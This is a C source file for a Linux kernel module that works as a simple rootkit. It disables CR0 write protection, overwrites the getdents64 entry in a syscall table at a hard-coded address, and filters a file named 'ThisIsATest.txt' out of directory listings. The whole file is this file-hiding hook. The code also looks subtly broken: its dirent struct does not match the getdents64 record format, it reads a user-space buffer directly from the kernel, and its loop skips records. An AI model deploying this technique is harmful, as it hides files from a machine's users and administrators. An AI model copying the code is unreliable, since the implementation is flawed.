#include <linux/module.h>
#include <asm/unistd.h>
 
int new_getdents64(const struct pt_regs *regs);
int load(void);
void unload(void);

typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs *regs);
static unsigned long *syscall_table = (unsigned long *)0xffffffff9d0001a0; 
static original_getdents64_t original_getdents64_ptr;
static char *file_name_to_hide = "ThisIsATest.txt";
 
struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
        unsigned long  d_off;     /* Offset to next linux_dirent */
        unsigned short d_reclen;  /* Length of this linux_dirent */
        char           d_name[];  /* Filename (null-terminated) */
};

static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

asmlinkage int new_getdents64(const struct pt_regs *regs) {
    struct linux_dirent *buff = (struct linux_dirent*)regs->si;
    int total_bytes_read = (int)original_getdents64_ptr(regs);

    int i;
    for (i=0; i < total_bytes_read; i++) {
        int length = buff->d_reclen;
        struct linux_dirent *next = (struct linux_dirent*)((char*)regs->si + i);
        if (!strcmp(buff->d_name, file_name_to_hide)) {
            // File matches name to hide, we need to delete it from the array.
            int length_to_copy = total_bytes_read - i - length;
            memmove(buff, next, length_to_copy);

            // Array has been shortened by the length of the member we've just deleted.
            total_bytes_read -= length;
        }

        i += length;
        // Add the bytes read to si so buff will point to the next member in the array.
        buff = next;
    }

    return total_bytes_read;
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    zero_cr0();
    original_getdents64_ptr = (original_getdents64_t)syscall_table[__NR_getdents64];
    printk(KERN_ALERT "%p OWP", original_getdents64_ptr);
    syscall_table[__NR_getdents64] = (unsigned long)new_getdents64;
    printk(KERN_ALERT "Overrided getdents64 ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    syscall_table[__NR_getdents64] = (unsigned long)original_getdents64_ptr;  
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");